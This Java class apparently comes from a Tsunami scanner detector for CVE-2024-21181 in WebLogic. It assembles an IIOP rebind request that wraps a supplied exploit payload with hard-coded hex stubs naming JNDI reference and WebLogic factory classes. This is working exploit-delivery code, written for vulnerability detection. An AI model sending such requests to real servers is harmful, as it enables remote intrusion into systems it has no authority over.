package com.google.tsunami.plugins.detectors.cves.cve202421181.weblogic.requests;

import com.google.tsunami.plugins.detectors.cves.cve202421181.Utils;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.Giop12Request;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.GiopPacketPayload;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.GiopRequest;
import java.nio.ByteBuffer;

public class RebindRequest extends WeblogicIiopRequest {
  private final byte[] exploitPayload;
  private final String referenceName;

  private static final byte[] STUB_PART1 =
      Utils.hexStringToByteArray(
          "00000001000000000000001D0000001C000000000000000100000000000000010000FFFF00000000000000007FFFFF020000003D524D493A6A617661782E6E616D696E672E5265666572656E63653A353346364335303331343345423345313A45384336394541324138453938443039000000007FFFFF0A00000037524D493A6A6176612E7574696C2E566563746F723A414537424231383643383442423736353A4439393737443542383033424146303100000000000C0101000000000000000000027FFFFF0A00000029524D493A5B4C6A6176612E6C616E672E4F626A6563743B3A3030303030303030303030303030303000000000000000E20000000A0000001D000000D60000000000000041524D493A6A617661782E6E616D696E672E537472696E67526566416464723A373032343839423237373039383530463A38343442463433434531313144434339000000000000001B6A617661782E6E616D696E672E537472696E6752656641646472000000000000000000000000000100000009636F6E74656E7473000000000000001E00000044000000000000002349444C3A6F6D672E6F72672F434F5242412F57537472696E6756616C75653A312E3000000000000C537472696E6756616C7565000000001200000000000000007FFFFF0A00000041524D493A6A617661782E6E616D696E672E537472696E67526566416464723A373032343839423237373039383530463A38343442463433434531313144434339000000007FFFFF0A0000002349444C3A6F6D672E6F72672F434F5242412F57537472696E6756616C75653A312E300000000000110000000D706172746974696F6E4E616D65000000FFFFFFFC7FFFFF0AFFFFFFFFFFFFFFB4000000080000000474657374FFFFFFFD000000D60000001D000000CE0000000000000041524D493A6A617661782E6E616D696E672E42696E617279526566416464723A314132384646424237373638313137443A44303941393342324445423338383437000000000000001B6A617661782E6E616D696E672E42696E61727952656641646472000000000000000000000000000100000004627566000000001E000000440000000000000018524D493A5B423A30303030303030303030303030303030000000000953657175656E636500000000000000130000000C000000000000000A00000000000000007FFFFF0A00000041524D493A6A617661782E6E616D696E672E42696E617279526566416464723A314132384646424237373638313137443A44303941393342324445423338383437000000007FFFFF0AFFFFFFFFFFFFFE7000000009000000056A766D4964000000FFFFFFFC7FFFFF0A00000018524D493A5B423A3030303030303030303030303030303000");
  private static final byte[] STUB_PART2 =
      Utils.hexStringToByteArray(
          "FFFFFFFD000002000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E3000000000000100000000000000000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E3000000000000100000000000000000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E3000000000000100000000000000000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E3000000000000100000000000000000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E3000000000000100000000000000000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E3000000000000100000000000000000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E3000000000000100000000000000000000002000000031000000000000002349444C3A6F6D672E6F72672F434F5242412F4162737472616374426173653A312E300000000000010000000000000000FFFFFFFF7FFFFF02FFFFFFFFFFFFFA80000000537765626C6F6769632E6D616E6167656D656E742E6D6265616E736572766572732E706172746974696F6E2E506172746974696F6E6564446F6D61696E52756E74696D654D62735265664F626A466163746F727900000000007FFFFF02FFFFFFFFFFFFFA180000001C6A617661782E6D616E6167656D656E742E4D4265616E536572766572");

  public RebindRequest(
      int requestId, byte[] keyAddress, String referenceName, byte[] exploitPayload) {
    super(requestId, keyAddress);
    this.referenceName = referenceName;
    this.exploitPayload = exploitPayload;
  }

  private byte[] generateStubData() {
    int stubDataLength =
        4 // Hardcoded int 1
            + 4 // Refernce name length (int)
            + referenceName.length()
            + Utils.calcBytesToAlign(referenceName.length())
            + STUB_PART1.length
            + 4 // (exploit payload length + 4) (int)
            + 4 // exploit payload length (again)
            + exploitPayload.length
            + Utils.calcBytesToAlign(exploitPayload.length)
            + STUB_PART2.length;

    ByteBuffer buf = ByteBuffer.allocate(stubDataLength);
    buf.putInt((byte) 1);
    buf.putInt(referenceName.length());
    buf.put(referenceName.getBytes());
    buf.put(new byte[Utils.calcBytesToAlign(buf.position())]);
    buf.put(STUB_PART1);
    buf.putInt(exploitPayload.length + 4);
    buf.putInt(exploitPayload.length);
    buf.put(exploitPayload);
    buf.put(new byte[Utils.calcBytesToAlign(buf.position())]);
    buf.put(STUB_PART2);
    return buf.array();
  }

  @Override
  public GiopPacketPayload payload() {
    return Giop12Request.builder()
        .setRequestId(requestId)
        .setKeyAddress(this.keyAddress)
        .setOperation(GiopRequest.Operation.OP_REBIND_ANY)
        .setServiceContextList(this.generateServiceContexts())
        .setStubData(this.generateStubData())
        .build();
  }
}
